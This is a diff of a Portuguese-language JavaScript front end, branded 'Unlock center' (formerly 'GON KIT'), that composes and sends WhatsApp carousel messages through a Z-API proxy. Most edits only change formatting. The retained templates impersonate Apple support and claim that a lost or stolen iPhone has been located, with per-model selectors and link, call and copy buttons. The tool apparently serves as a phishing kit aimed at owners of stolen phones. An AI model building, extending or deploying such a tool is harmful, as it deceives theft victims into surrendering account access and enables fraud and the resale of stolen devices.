@@ -9,7 +9,7 @@ let proxyCarouselUrl = `${proxyBaseUrl}${endpointPaths.sendCarousel}`; // Endpoi
 
 async function initApiConfig() {
     try {
-        const res = await fetch('/config/api_config.json', { cache: 'no-store' });
+  const res = await fetch('/config/api_config.json', { cache: 'no-store' });
         if (res.ok) {
             const cfg = await res.json();
             if (cfg && typeof cfg === 'object') {
@@ -65,7 +65,7 @@ const countriesDDI = [
     { name: "Colômbia", code: "57" }, { name: "Coreia do Sul", code: "82" },
     { name: "Coreia do Norte", code: "850" }, { name: "Costa Rica", code: "506" },
     { name: "Cuba", code: "53" }, { name: "Dinamarca", code: "45" },
-    { name: "Ecuador", code: "593" }, { name: "Egito", code: "20" },
+    { name: "Ecuador", code: "593" }, { name: "Egito", code: "20" }, 
     { name: "El Salvador", code: "503" }, { name: "Espanha", code: "34" },
     { name: "Estados Unidos", code: "1" }, { name: "Estônia", code: "372" },
     { name: "Filipinas", code: "63" }, { name: "Finlândia", code: "358" },
@@ -107,7 +107,7 @@ const countriesDDI = [
     { name: "Vietnã", code: "84" }, { name: "Iêmen", code: "967" },
     { name: "Zâmbia", code: "260" }, { name: "Zimbábue", code: "263" }
 ];
-countriesDDI.forEach(function (c) {
+countriesDDI.forEach(function(c){
     const raw = String(c.name || '').trim();
     let id = String(c.id || '').trim();
     if (!id) { id = raw.replace(/\s+/g, "_").toUpperCase(); }
@@ -139,13 +139,13 @@ const capacidadesIphoneGlobal = [
 ];
 
 // --- DEFINIÇÕES DE MENSAGENS COM ASTERISCOS CORRIGIDOS ---
-const generalCarouselMessageTemplate = "*🍏 Assistente Virtual Apple – Suporte ao Cliente*";
-// Versões do título da Mensagem Geral por idioma
-const generalCarouselMessageTemplateLang = {
-    pt: "*🍏 Assistente Virtual Apple – Suporte ao Cliente*",
-    en: "*🍏 Apple Virtual Assistant – Customer Support*",
-    es: "*🍏 Asistente Virtual de Apple – Atención al Cliente*"
-};
+ const generalCarouselMessageTemplate = "*🍏 Assistente Virtual Apple – Suporte ao Cliente*";
+ // Versões do título da Mensagem Geral por idioma
+ const generalCarouselMessageTemplateLang = {
+     pt: "*🍏 Assistente Virtual Apple – Suporte ao Cliente*",
+     en: "*🍏 Apple Virtual Assistant – Customer Support*",
+     es: "*🍏 Asistente Virtual de Apple – Atención al Cliente*"
+ };
 const defaultCardTemplateText = `*🔔 ALERTA DE LOCALIZAÇÃO: Dispositivo Encontrado*
 
 Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roubado.
@@ -366,7 +366,7 @@ const carouselTemplates = [
     }
 ];
 
-let cardIndexCounter = 0;
+let cardIndexCounter = 0; 
 
 // --- Funções Auxiliares ---
 
@@ -419,14 +419,14 @@ function populateiPhoneModelSelect(selectElement, modelsArray) {
             selectElement.value = modelsArray[0].name;
             selectElement.dispatchEvent(new Event('change'));
         }
-    } catch (_) { }
+    } catch (_) {}
     try {
         window.sendUiLog && window.sendUiLog('carousel.populateModelSelect', {
             selectId: selectElement.id || null,
             modelsCount: Array.isArray(modelsArray) ? modelsArray.length : 0,
             selected: selectElement.value || null
         });
-    } catch (_) { }
+    } catch (_) {}
 }
 
 /**
@@ -446,13 +446,13 @@ function updateCapacityAndColorSelects(cardId) {
     const colorSelect = document.getElementById(`card-color-${cardId}`);
 
     // Limpa os selects de capacidade e cor antes de preencher
-    populateSelect(capacitySelect, []);
+    populateSelect(capacitySelect, []); 
     populateSelect(colorSelect, []);
 
     if (selectedTemplate && selectedSubModelName) {
         // Encontra os dados do sub-modelo selecionado dentro do template
         const subModelData = selectedTemplate.subModels.find(sub => sub.name === selectedSubModelName);
-
+        
         if (subModelData) {
             // Preenche capacidade e cor com base nos dados do sub-modelo
             populateSelect(capacitySelect, subModelData.capacidades);
@@ -484,7 +484,7 @@ function updateCardText(cardId) {
     const capacidadeSelect = document.getElementById(`card-capacity-${cardId}`);
     const colorSelect = document.getElementById(`card-color-${cardId}`);
     const textarea = document.getElementById(`card-text-${cardId}`);
-
+    
     // O ponto de partida é SEMPRE o texto original do template armazenado no data-template-text
     // Isso garante que o placeholder original esteja disponível
     let baseText = textarea.getAttribute('data-template-text') || defaultCardTemplateText;
@@ -505,9 +505,9 @@ function updateCardText(cardId) {
     if (cor) {
         fullModelStringParts.push(cor);
     }
-
+    
     let fullModelContent = fullModelStringParts.join(' ').trim();
-
+    
     // O texto que será usado para substituir o placeholder. Se vazio, o placeholder será removido.
     const replacementModelText = fullModelContent ? `*${fullModelContent}*` : '';
 
@@ -516,14 +516,14 @@ function updateCardText(cardId) {
     let newText = baseText.replace(placeholderRegex, replacementModelText);
 
     // Normaliza múltiplos espaços para um único espaço no texto final.
-    newText = newText.replace(/ {2,}/g, ' ');
+    newText = newText.replace(/ {2,}/g, ' '); 
 
-    textarea.value = newText.trim();
+    textarea.value = newText.trim(); 
 }
 
 
 // --- Componente Select Customizado (dropdown com cor do painel) ---
-window.enhanceSelect = function (selectEl) {
+window.enhanceSelect = function(selectEl) {
     if (!selectEl || selectEl.dataset.enhanced === '1') return;
     selectEl.dataset.enhanced = '1';
 
@@ -595,7 +595,7 @@ window.enhanceSelect = function (selectEl) {
                 optionsCount: selectEl.options ? selectEl.options.length : 0,
                 rect: { left: rect.left, top: rect.top, width: rect.width, bottom: rect.bottom }
             });
-        } catch (_) { }
+        } catch (_) {}
     };
 
     trigger.addEventListener('click', (e) => {
@@ -624,7 +624,7 @@ window.enhanceSelect = function (selectEl) {
     updateTriggerLabel();
 };
 
-window.refreshEnhancedSelect = function (selectEl) {
+window.refreshEnhancedSelect = function(selectEl) {
     if (!selectEl) return;
     const wrapper = selectEl.closest('.custom-select');
     if (!wrapper) return;
@@ -664,13 +664,13 @@ window.refreshEnhancedSelect = function (selectEl) {
 };
 
 // Envio de logs de UI para diagnóstico
-window.sendUiLog = async function (event, details) {
+window.sendUiLog = async function(event, details) {
     try {
         await authFetch('/ui/log', {
             method: 'POST',
             body: { event, details }
         });
-    } catch (_) { }
+    } catch (_) {}
 };
 
 // --- Funções para Gerenciar Modelos de Carrossel ---
@@ -722,8 +722,8 @@ function loadCarouselTemplate() {
     // Ao carregar um template, adiciona os cartões padrão do template.
     // O addCarouselCard agora lida com o preenchimento inicial dos selects.
     selectedTemplate.cards.forEach(cardData => {
-        addCarouselCard({
-            ...cardData,
+        addCarouselCard({ 
+            ...cardData, 
             subModelsList: selectedTemplate.subModels // Passa a lista completa de subModelos para o cartão
         });
     });
@@ -734,7 +734,7 @@ function addCarouselCard(cardData = null) {
     const currentCardId = cardIndexCounter;
     const container = document.getElementById('carousel-cards-container');
     const cardDiv = document.createElement('div');
-    cardDiv.className = 'card-editor bg-transparent backdrop-blur-xl p-6 rounded-xl shadow border border-white/20 mb-6';
+  cardDiv.className = 'card-editor bg-transparent backdrop-blur-xl p-6 rounded-xl shadow border border-white/20 mb-6';
     cardDiv.setAttribute('data-card-id', currentCardId);
 
     cardDiv.innerHTML = `
@@ -996,7 +996,7 @@ function addCarouselCard(cardData = null) {
     }
     // Atualiza preview inicial
     updatePreview();
-
+    
     // Chamada inicial para garantir que todos os selects secundários e o texto estejam corretos
     // mesmo que o modelo padrão já venha selecionado no template.
     updateCapacityAndColorSelects(currentCardId);
@@ -1032,16 +1032,16 @@ function addCardButton(cardId, buttonData = null) {
         return;
     }
     const buttonDiv = document.createElement('div');
-    buttonDiv.className = 'button-editor relative bg-transparent backdrop-blur-xl p-4 rounded-xl border border-white/30 shadow mb-3';
+  buttonDiv.className = 'button-editor relative bg-transparent backdrop-blur-xl p-4 rounded-xl border border-white/30 shadow mb-3';
     const buttonIndex = buttonsContainer.children.length;
-
+    
     const buttonUniqueId = `btn_${cardId}_${buttonIndex}`;
 
     // Estilo do botão "- Remover Botão":
     // Se for Cartão #3, aplicar a paleta/efeitos da aba "Sair" sem reduzir tamanho
     const removeBtnClass = (cardId === 3)
-        ? 'remove-button-btn mt-4 px-4 py-2 rounded-xl border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-medium transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]'
-        : 'remove-button-btn mt-4 py-2 px-4 bg-red-600 text-white font-medium rounded-xl shadow hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-400/50 transition duration-150 ease-in-out';
+      ? 'remove-button-btn mt-4 px-4 py-2 rounded-xl border border-red-400/40 bg-red-500/20 hover:bg-red-500/30 text-red-200 font-medium transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-red-400/30 hover:shadow hover:shadow-red-500/20 active:translate-y-[1px]'
+      : 'remove-button-btn mt-4 py-2 px-4 bg-red-600 text-white font-medium rounded-xl shadow hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-400/50 transition duration-150 ease-in-out';
 
     buttonDiv.innerHTML = `
         <div class="space-y-2">
@@ -1098,17 +1098,17 @@ function addCardButton(cardId, buttonData = null) {
 
         [urlField, phoneField, copyField].forEach(el => {
             if (el) {
-                el.classList.add('bg-transparent', 'border', 'border-white/20', 'rounded-xl', 'p-3', 'backdrop-blur-xl');
+  el.classList.add('bg-transparent','border','border-white/20','rounded-xl','p-3','backdrop-blur-xl');
             }
         });
         const labelInput = document.getElementById(`button-label-${cardId}-${buttonIndex}`);
         if (labelInput && labelInput.parentElement) {
-            labelInput.parentElement.classList.add('bg-transparent', 'border', 'border-white/30', 'rounded-xl', 'p-3', 'backdrop-blur-xl');
+  labelInput.parentElement.classList.add('bg-transparent','border','border-white/30','rounded-xl','p-3','backdrop-blur-xl');
         }
     } catch (e) {
         // silencioso
     }
-
+    
     buttonDiv.querySelector('.remove-button-btn').onclick = () => removeCardButton(buttonDiv);
 
     // Liga o evento via JS para evitar handler inline
@@ -1217,7 +1217,7 @@ function removeCardButton(buttonElementDiv) {
 
 async function enviarCarrossel() {
     const log = document.getElementById('log');
-
+    
     const ddiSelect = document.getElementById('countryDDI');
     const rawNumero = document.getElementById('numero').value.trim();
     const selectedOption = ddiSelect && ddiSelect.options ? ddiSelect.options[ddiSelect.selectedIndex] : null;
@@ -1225,7 +1225,7 @@ async function enviarCarrossel() {
     let numeroCompleto = ddiDigits + rawNumero;
 
     // ADIÇÃO CRÍTICA: REMOVER QUALQUER '+' INICIAL DO NÚMERO COMPLETO
-    numeroCompleto = numeroCompleto.replace(/^\+/, '');
+    numeroCompleto = numeroCompleto.replace(/^\+/, ''); 
 
     // O frontend não precisa enviar 'mensagemGeral' ou 'delayMessage' para o proxy
     // se o proxy já não as usa para o endpoint de carrossel da Z-API.
@@ -1249,7 +1249,7 @@ async function enviarCarrossel() {
 
     for (const cardEditor of cardEditors) {
         const cardId = cardEditor.getAttribute('data-card-id');
-
+        
         const cardText = document.getElementById(`card-text-${cardId}`).value;
         const cardImage = document.getElementById(`card-image-${cardId}`).value.trim();
 
@@ -1260,7 +1260,7 @@ async function enviarCarrossel() {
 
         const cardButtons = [];
         const buttonEditors = cardEditor.querySelectorAll(`.button-editor`);
-
+        
         for (let i = 0; i < buttonEditors.length; i++) {
             const buttonType = document.getElementById(`button-type-${cardId}-${i}`).value;
             const buttonLabel = document.getElementById(`button-label-${cardId}-${i}`).value.trim();
@@ -1270,7 +1270,7 @@ async function enviarCarrossel() {
             const buttonCopy = document.getElementById(`button-copy-${cardId}-${i}`)?.value.trim();
 
             if (!buttonLabel) {
-                log.innerText = `❌ O botão #${i + 1} do cartão #${cardId} requer um texto (label).`;
+                log.innerText = `❌ O botão #${i+1} do cartão #${cardId} requer um texto (label).`;
                 return;
             }
 
@@ -1290,19 +1290,19 @@ async function enviarCarrossel() {
 
             if (buttonType === 'URL') {
                 if (!buttonUrl) {
-                    log.innerText = `❌ O botão URL #${i + 1} do cartão #${cardId} requer uma URL.`;
+                    log.innerText = `❌ O botão URL #${i+1} do cartão #${cardId} requer uma URL.`;
                     return;
                 }
                 button.url = normalizeUrlMaybe(buttonUrl);
             } else if (buttonType === 'CALL') {
                 if (!buttonPhone) {
-                    log.innerText = `❌ O botão de Chamada #${i + 1} do cartão #${cardId} requer um número de telefone.`;
+                    log.innerText = `❌ O botão de Chamada #${i+1} do cartão #${cardId} requer um número de telefone.`;
                     return;
                 }
                 button.phone = buttonPhone;
             } else if (buttonType === 'COPY') {
                 if (!buttonCopy) {
-                    log.innerText = `❌ O botão de Copiar #${i + 1} do cartão #${cardId} requer um texto para copiar.`;
+                    log.innerText = `❌ O botão de Copiar #${i+1} do cartão #${cardId} requer um texto para copiar.`;
                     return;
                 }
                 button.copyText = buttonCopy;
@@ -1312,7 +1312,7 @@ async function enviarCarrossel() {
         }
 
         carouselCards.push({
-            text: cardText,
+            text: cardText, 
             image: normalizeUrlMaybe(cardImage),
             buttons: cardButtons
         });
@@ -1329,7 +1329,7 @@ async function enviarCarrossel() {
         delayMessage,
         carousel: carouselCards // 'carouselCards' é o array de cartões do frontend
     };
-    // --- ADIÇÃO DE LOG NO FRONTEND ---
+// --- ADIÇÃO DE LOG NO FRONTEND ---
     console.log("Payload enviado do frontend para o proxy:", JSON.stringify(payloadToProxy, null, 2));
     // --- FIM DA ADIÇÃO DE LOG ---
     try {
@@ -1355,7 +1355,7 @@ async function enviarCarrossel() {
         }
 
         if (response.ok) {
-            log.innerText = '✅ mensagem enviada com sucesso By GON KIT';
+            log.innerText = '✅ mensagem enviada com sucesso By Unlock center';
             try {
                 Swal.fire({
                     icon: 'success',
@@ -1395,9 +1395,9 @@ async function enviarCarrossel() {
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
+    document.addEventListener('DOMContentLoaded', () => {
     populateCarouselTemplatesDropdown();
-
+    
     const mensagemGeralInput = document.getElementById("mensagemGeral");
     if (mensagemGeralInput) {
         // Inicializa a mensagem geral conforme idioma atual
@@ -1410,13 +1410,13 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // Inicializa com um cartão vazio (ou padrão)
-    addCarouselCard();
-
+    addCarouselCard(); 
+    
     const countryDDISelect = document.getElementById("countryDDI");
     populateSelect(countryDDISelect, countriesDDI, true);
-
+    
     countryDDISelect.value = "BR"; // Define DDI do Brasil como padrão
-
+    
     if (window.enhanceSelect) {
         const seriesSelect = document.getElementById('carouselTemplate');
         if (seriesSelect) window.enhanceSelect(seriesSelect);
@@ -1424,8 +1424,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 });
 // Define o idioma e atualiza o texto base de todos os cartões
-window.setCardLanguage = function (lang) {
-    const allowed = ['pt', 'en', 'es'];
+window.setCardLanguage = function(lang) {
+    const allowed = ['pt','en','es'];
     window.cardTextLang = allowed.includes(lang) ? lang : 'pt';
     const editors = document.querySelectorAll('.card-editor');
     const base = getDefaultCardTextByLang();
